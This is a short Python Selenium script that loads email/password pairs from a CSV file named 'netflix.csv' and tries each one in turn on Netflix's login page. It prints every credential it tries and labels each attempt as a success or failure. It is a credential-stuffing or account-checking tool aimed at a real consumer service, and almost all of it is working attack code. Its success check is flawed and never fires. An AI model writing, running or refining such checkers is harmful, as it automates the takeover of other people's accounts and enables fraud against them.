from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from models import Credential
import time
import random
creds = Credential.from_csv(file_name="netflix.csv")
firefox_binary = FirefoxBinary('C:\\Users\\abdul\\AppData\\Local\\Mozilla Firefox\\firefox.exe')


counter = 0

driver = webdriver.Firefox(firefox_binary=firefox_binary)
driver.get("https://www.netflix.com/pk/login")
for x in range(len(creds)):   
    try:
        print(f"Trying email:{creds[counter].uname} password:{creds[counter].passwd}")
        email_field = driver.find_element_by_xpath("//*[@id='id_userLoginId']")
        email_field.clear()
        email_field.send_keys(creds[counter].uname)

        password_field = driver.find_element_by_xpath("//*[@id='id_password']")
        password_field.clear()
        password_field.send_keys(creds[counter].passwd, Keys.ENTER)

        submit_button = driver.find_element_by_xpath("/html/body/div[1]/div/div[3]/div/div/div[1]/form/button")
        submit_button.click()
        counter+=1
        try:
            check_login = driver.find_elements_by_class_name("login-form")
        except Exception as e:
            print(f"SUCCESS")
            continue
        print(f"\033[91m FAIL")
    except Exception as e:
        # print(f"Error: {e}")
        pass
        
driver.close()